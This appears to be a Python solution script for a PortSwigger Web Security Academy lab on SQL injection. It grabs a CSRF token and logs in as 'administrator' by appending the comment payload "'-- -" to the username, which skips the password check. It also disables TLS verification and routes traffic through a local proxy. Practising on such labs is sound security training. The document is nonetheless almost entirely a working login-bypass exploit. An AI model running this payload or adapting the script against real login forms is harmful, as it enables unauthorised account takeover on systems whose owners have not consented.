
# SQL injection vulnerability allowing login bypass

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = "https://0a0900d7039b4ecbc0bf780a00e000a4.web-security-academy.net/login"

# Creating sessions
s = requests.Session()

# First get CSRF token
r = s.get(url, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
csrf = bs.find('input')['value']

# Sending payload

payload = "'-- -" 

params = {
    "csrf" : csrf,
    'username' : 'administrator' + payload,
    'password' : 'password' 
}

r = s.post(url, data=params, verify=False)

if 'Your username is: administrator' in r.text:
    print('[+] Successfull!')
else:
    print('[-] Unsuccessfull!')